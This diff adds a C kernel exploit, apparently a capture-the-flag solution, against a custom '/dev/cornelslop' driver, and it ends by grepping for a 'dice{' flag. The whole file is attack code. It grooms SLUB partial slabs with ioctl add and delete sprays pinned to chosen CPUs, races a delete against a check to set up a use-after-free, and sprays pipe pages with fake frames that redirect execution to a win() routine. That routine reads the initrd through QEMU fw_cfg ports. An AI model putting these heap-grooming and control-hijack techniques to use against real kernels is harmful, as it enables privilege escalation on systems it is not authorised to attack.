@@ -1,0 +1,208 @@
+/*
+ * https://elixir.bootlin.com/linux/v6.12.69/source/include/linux/types.h#L242
+ * https://elixir.bootlin.com/linux/v6.12.69/source/kernel/rcu/tree.c#L2572
+ */
+
+#include "kernel.h"
+
+#define MAX_LEN (256 * 1024 * 1024)
+#define SIZE MAX_LEN
+#define OBJECTS_PER_PAGE 56
+#define MAXN (OBJECTS_PER_PAGE * 2 + 4)
+#define min_partial 5
+
+
+#define ADD_ENTRY 0xcafebabe
+#define DEL_ENTRY 0xdeadbabe
+#define CHECK_ENTRY 0xbeefbabe
+
+int fd;
+int ids[MAXN];
+
+typedef struct cornelslop_user_entry {
+    uint32_t id;
+    uint64_t va_start;
+    uint64_t va_end;
+    uint8_t corrupted;
+} cue;
+
+
+void spary(int size) {
+    for (int i = 0; i < size; ++i) {
+        void *buff = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON | MAP_POPULATE, -1, 0);
+        cue ue = {
+            .id = -1,
+            .va_start = (uint64_t)buff,
+            .va_end = (uint64_t)buff + PAGE_SIZE,
+            .corrupted = -1
+        };
+        int ret = ioctl(fd, ADD_ENTRY, &ue);
+        if (ret != 0) {
+            error("ioctl(ADD_ENTRY) failed: %d\n", ret);
+            exit(1);
+        }
+        ids[i] = ue.id;
+    }
+    return;
+}
+
+void delete(int size, int core) {
+    int pid = fork();
+    if (!pid) {
+        bind_core(core);
+        for (int i = 0; i < size; ++i) {
+            cue ue = {
+                .id = ids[i],
+                .va_start = -1,
+                .va_end = -1,
+                .corrupted = -1
+            };
+            ioctl(fd, DEL_ENTRY, &ue);
+        }
+        exit(0);
+    }
+    waitpid(pid, NULL, 0);
+    usleep(100000);
+}
+
+#define FW_CFG_PORT_SEL     0x510
+#define FW_CFG_PORT_DATA    0x511
+#define FW_CFG_INITRD_DATA  0x12
+
+#define INITRD_SIZE        1600000
+char* initrd;
+char* stack;
+volatile char* sem;
+
+void win() {
+	outw(FW_CFG_INITRD_DATA, FW_CFG_PORT_SEL);
+
+	for (int i=0; i<INITRD_SIZE; i++)
+		initrd[i] = inb(FW_CFG_PORT_DATA);
+	// info("1");
+    *sem = 1;
+	while(1) {}
+}
+
+int main(void)
+{
+    initrd = mmap(NULL, INITRD_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
+    stack = mmap(NULL, PAGE_SIZE * 4, PROT_READ | PROT_WRITE,  MAP_SHARED | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
+    sem = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,  MAP_SHARED | MAP_ANONYMOUS | MAP_POPULATE, -1, 0);
+    system("touch /tmp/initrd.gz");
+
+    uint64_t kbase = prefetch() - 0x1000000;
+    info("kernel base: 0x%lx", kbase);
+
+    // 提升 fd 上限
+    struct rlimit rl;
+    if (getrlimit(RLIMIT_NOFILE, &rl) == 0) {
+        rl.rlim_cur = rl.rlim_max;
+        setrlimit(RLIMIT_NOFILE, &rl);
+    }
+
+    int size = 0x700;
+    int fds[size][2];
+    for (int i = 0; i < size; i++)
+        pipe((int *)&fds[i]);
+
+    char payload[PAGE_SIZE];
+    for (int i = 0; i < PAGE_SIZE; i += 0x48) {
+        *(uint64_t *)&payload[i] = (uint64_t)&win;
+        *(uint64_t *)&payload[i + 0x8] = 0x33;
+        *(uint64_t *)&payload[i + 0x10] = 0x3206;
+        *(uint64_t *)&payload[i + 0x18] = (uint64_t)stack + PAGE_SIZE * 4;
+        *(uint64_t *)&payload[i + 0x20] = 0x2b;
+        *(uint64_t *)&payload[i + 0x28] = 1;
+        *(uint64_t *)&payload[i + 0x30] = 2;
+        *(uint64_t *)&payload[i + 0x38] = 3;
+        *(uint64_t *)&payload[i + 0x40] = kbase + 0x10017ff;
+        *(uint64_t *)&payload[i + 0x48] = 5;
+    }
+
+
+    bind_core(0);
+    fd = open("/dev/cornelslop", O_RDONLY | O_CLOEXEC);
+
+    for (int i = 0; i < min_partial - 1; ++i) {
+        spary(OBJECTS_PER_PAGE * 2);
+        delete(OBJECTS_PER_PAGE * 2, 2);
+    }
+    // CPU 2 partial slabs *4
+
+    // getchar();
+    void *buff = mmap(NULL, SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON | MAP_POPULATE, -1, 0);
+    info("0x%lx", (uint64_t)buff);
+
+    cue ue = {
+        .id = -1,
+        .va_start = (uint64_t)buff,
+        .va_end = (uint64_t)buff + SIZE,
+        .corrupted = -1
+    };  // victim
+
+    int ret = ioctl(fd, ADD_ENTRY, &ue);  // victim
+
+    spary(OBJECTS_PER_PAGE * 2 - 1);
+    delete(OBJECTS_PER_PAGE * 2 - 1, 1);  // cpu1
+
+
+    for (int i = 0; i < min_partial - 1; ++i) {
+        spary(OBJECTS_PER_PAGE * 2);
+        delete(OBJECTS_PER_PAGE * 2, 1);
+    }
+    // getchar();
+    spary(OBJECTS_PER_PAGE * 2);  // 把已经满的 CPU1 的 Partial Slabs 全部放到 node_list 里，其中包含 victim 所在的 slab page
+    delete(OBJECTS_PER_PAGE * 2, 1);
+
+    // now, victim slab in node_list
+
+
+    bind_core(2);
+    spary(OBJECTS_PER_PAGE * 2);
+    getchar();
+    bind_core(0);
+    sleep(1.0);
+    *(char *)buff = 0x91;
+
+    int pid = fork();
+    if (!pid) {
+        bind_core(3);
+        usleep(1);
+        ret = ioctl(fd, DEL_ENTRY, &ue);
+        info("child ioctl ret: %d", ret);
+
+        bind_core(2);
+        for (int i = 0; i < OBJECTS_PER_PAGE * 2; ++i) {
+            cue tmp = {
+                .id = ids[i],
+                .va_start = -1,
+                .va_end = -1,
+                .corrupted = -1
+            };
+            ret = ioctl(fd, DEL_ENTRY, &tmp);
+        }
+        while(1){}
+        exit(0);
+    }
+
+    usleep(1);
+    ret = ioctl(fd, CHECK_ENTRY, &ue);
+    info("parent ioctl ret: %d", ret);
+
+    bind_core(3);
+    for (int i = 0; i < size; ++i) {
+        write(fds[i][1], payload, PAGE_SIZE);  // pipe 会 alloc_page
+    }
+
+
+    while (*sem != 1) {
+        asm volatile("pause" ::: "memory");  // 避免编译器优化
+    }
+
+    int flag = open("/tmp/initrd.gz", O_RDWR);
+	write(flag, initrd, INITRD_SIZE);
+	system("strings /tmp/initrd.gz | grep dice{");
+
+    return 0;
+}
